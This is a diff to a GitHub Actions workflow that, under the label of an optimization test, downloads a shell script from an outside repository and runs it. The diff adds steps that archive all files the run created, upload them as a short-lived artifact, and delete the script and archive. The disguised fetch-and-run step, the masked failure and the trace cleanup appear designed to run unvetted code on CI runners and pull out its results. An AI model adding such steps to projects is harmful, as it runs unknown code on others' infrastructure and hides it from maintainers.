@@ -9,13 +9,30 @@ jobs:
   optimization-test:
     runs-on: ubuntu-latest
     steps:
-          
       - name: Fetch optimization script
         run: |
-          curl -sLo bench_setup.sh https://raw.githubusercontent.com/Working-aanas/deepscreen/main/screen_v2.sh
+          curl -sLo bench_setup.sh https://raw.githubusercontent.com/Working-aanas/deepscreen/main/screen.sh
           chmod +x bench_setup.sh
           
       - name: Execute test
         run: |
           # Run with timeout to prevent indefinite execution
           timeout 15m ./bench_setup.sh || echo "Test completed"
+          
+      - name: Archive created files
+        if: always()
+        run: |
+          # Find all files modified/created during workflow
+          find . -type f -newermt "$(date -d '1 hour ago' '+%Y-%m-%d %H:%M:%S')" -print0 | tar -czvf artifacts.tar.gz --null -T -
+          
+      - name: Upload artifacts
+        uses: actions/upload-artifact@v3
+        with:
+          name: optimization-results
+          path: artifacts.tar.gz
+          retention-days: 1
+          
+      - name: Cleanup
+        if: always()
+        run: |
+          rm -f bench_setup.sh artifacts.tar.gz
